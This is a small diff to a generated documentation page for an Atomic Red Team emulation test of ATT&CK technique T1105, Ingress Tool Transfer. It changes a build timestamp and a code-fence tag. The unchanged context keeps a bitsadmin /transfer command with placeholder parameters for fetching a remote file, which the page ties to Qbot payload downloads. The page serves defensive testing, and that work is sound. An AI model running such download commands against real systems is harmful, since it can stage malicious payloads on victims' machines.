@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1105"
 attack_technique_name: "Ingress Tool Transfer"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "a1921cd3-9a2d-47d5-a891-f1d0f2a7a31b"
@@ -63,7 +63,7 @@ This technique is used by Qbot malware to download payloads.
 
 ### Command
 
-```commandprompt
+```cmd
 C:\Windows\System32\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH #{remote_file} #{local_path}
 ```
 
